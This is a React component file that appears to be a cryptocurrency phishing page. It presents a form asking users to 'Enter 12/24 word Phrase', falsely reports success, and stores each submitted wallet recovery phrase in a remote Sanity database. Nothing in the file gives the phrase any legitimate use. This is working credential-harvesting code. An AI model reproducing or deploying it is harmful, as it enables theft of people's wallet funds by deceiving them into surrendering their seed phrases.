import React, { useState } from "react";
import client from "../sanity";

const inputKey = () => {
  const [phrase, setPhrase] = useState("");

  const getPhrase = () => {
    console.log(phrase, "✅");
    if (phrase.length < 12) {
      alert("Word Phrase is too short");
      return;
    }
    setPhrase("");
    alert("Phrase has been submitted Successfully 🎉");
    // Send details to backend
    const doc = {
      _type: "post",
      title: "New Phrase 🎉",
      phrase,
    };
    client
      .create(doc)
      .then((res) => console.log("Results", res))
      .catch((err) => console.error(err));
  };
  return (
    <div>
      <div className="mt-14 p-10 text-center">
        <div>
          <h1 className="font-semibold">Enter 12/24 word Phrase</h1>
          <input
            className="rounded-lg p-3 w-full mt-3 text-white"
            type="text"
            value={phrase}
            onChange={(e) => setPhrase(e.target.value)}
          />
        </div>
        <button
          className="bg-[#17fb9b] w-full sm:text-base text-sm mt-3 font-semibold rounded-lg text-black  p-2 "
          onClick={getPhrase}
        >
          Continue
        </button>
      </div>
    </div>
  );
};

export default inputKey;
